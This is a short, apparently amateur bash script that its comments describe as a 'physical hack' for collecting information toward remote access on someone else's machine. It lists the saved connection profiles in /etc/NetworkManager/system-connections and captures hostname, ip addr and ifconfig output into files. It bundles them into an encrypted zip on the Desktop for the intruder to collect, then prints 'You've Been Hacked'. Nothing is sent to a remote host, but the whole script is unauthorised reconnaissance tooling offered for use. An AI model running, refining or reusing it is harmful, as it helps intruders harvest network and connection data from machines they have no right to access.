
#Goal: This script serves as a physical hack for gathering information for remote access
#Go to the network directories as well as using all the network commands to aquire data and output it to a directory, then 
#encrpyt it

#To do now:
#Use the commands to pool as much data about the nerwork of the host, as much as possible
#record commands to retrieve data, and then script a network data feed

#To do now (NEW): Start scripting the feed 

function Make_Hub_Directory {

	cd 
	cd Desktop
	mkdir Net_Work_Data_Feed_Hub
	
	echo "Network Hub declared. Doing stuff...."
	
	Extract_Net_Man
	
}

function Extract_Net_Man {

	cd 
	cd /
	cd etc
	cd NetworkManager
	cd system-connections
	ls -la > Net_sys.txt
	
	echo "Displaying System Connections Now"
	cat Net_sys.txt
	read -p "Hit enter"
	
	Aquire_Network_Info
}

function Aquire_Network_Info {

#Take me back to root(~)

	cd 
	
#Execute these commands

	hostname -i > IP_Info.txt
	ip addr show > IP_Addr.txt
	
	mv IP_Addr.txt Desktop
	mv IP_Info.txt Desktop
	
	echo "IP information secured and transfered...."
	
	Lock_Encrypt_Send	
	
}

function Lock_Encrypt_Send {

	cd 
	cd Desktop
	ifconfig > IP_Detailed_Info.txt
	
	mv IP_Detailed_Info.txt Net_Work_Data_Feed_Hub
	mv IP_Addr.txt Net_Work_Data_Feed_Hub
	mv IP_Info.txt Net_Work_Data_Feed_Hub
	
	zip -e -r Net_Work_Data_Feed_Hub Net_Work_Data_Feed_Hub
	
	echo "Data collected and encrypted...."
	
	Fin
	
	}
	
function Fin {

	echo "Done ^_^ Collect the folder and bounce"
	
	Hacked
	
}

function Hacked {

	echo "You've Been Hacked ^^____^^"
	#Eventually I want the code to draw my ascii logo after an attack
	read -p "Bye bye"

}

Make_Hub_Directory


	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
